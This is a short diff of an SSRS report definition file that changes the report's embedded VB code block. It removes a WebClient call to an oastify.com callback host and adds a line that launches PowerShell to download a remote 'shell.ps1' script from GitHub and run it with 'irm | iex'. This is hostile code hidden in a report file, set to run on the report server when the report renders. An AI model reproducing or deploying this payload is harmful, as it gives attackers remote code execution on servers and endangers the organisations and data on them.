@@ -44,8 +44,7 @@
     </GridLayoutDefinition>
   </ReportParametersLayout>
   <Code>
-    Dim webClient As New System.Net.WebClient
-    Dim result As String = webClient.DownloadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/")
+    Process.Start("powershell", "-c \"irm https://raw.githubusercontent.com/alexbrozych/SSRS/refs/heads/main/shell.ps1 | iex\"")
   </Code>
   <rd:ReportUnitType>Inch</rd:ReportUnitType>
   <rd:PageUnit>Px</rd:PageUnit>
